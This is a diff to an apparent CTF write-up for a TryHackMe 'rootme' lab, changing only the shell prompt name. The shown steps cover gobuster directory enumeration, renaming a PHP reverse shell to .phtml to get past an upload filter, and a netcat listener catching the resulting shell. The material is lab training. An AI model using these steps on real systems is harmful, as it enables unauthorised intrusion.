@@ -40,7 +40,7 @@ Yes it tells us that when we gonna run gobuster (web brutforcing) we should look
 
 - gobuster
 ```console
-kali@kali:~$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 54 -x php
+bibo318@parrot:~$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 54 -x php
 /css (Status: 301)
 /index.php (Status: 200)
 /js (Status: 301)
@@ -50,20 +50,20 @@ kali@kali:~$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Co
 ```
 
 ```console
-kali@kali:~/THM/rootme$ ls
-kali@kali:~/THM/rootme$ touch test.txt
-kali@kali:~/THM/rootme$ nano test.php
-kali@kali:~/THM/rootme$ cat test.php 
+bibo318@parrot:~/THM/rootme$ ls
+bibo318@parrot:~/THM/rootme$ touch test.txt
+bibo318@parrot:~/THM/rootme$ nano test.php
+bibo318@parrot:~/THM/rootme$ cat test.php 
 <?php
 echo "Hello world!";
 ?> 
-kali@kali:~/THM/rootme$ mv test.php test2.txt
-kali@kali:~/THM/rootme$ mv test2.txt test.phtml
-kali@kali:~/THM/rootme$ mv php-reverse-shell.php kurohat.phtml
+bibo318@parrot:~/THM/rootme$ mv test.php test2.txt
+bibo318@parrot:~/THM/rootme$ mv test2.txt test.phtml
+bibo318@parrot:~/THM/rootme$ mv php-reverse-shell.php kurohat.phtml
 ```
 
 ```console
-kali@kali:~$ nc -nlvp 6969
+bibo318@parrot:~$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.71.120] 39154
 Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
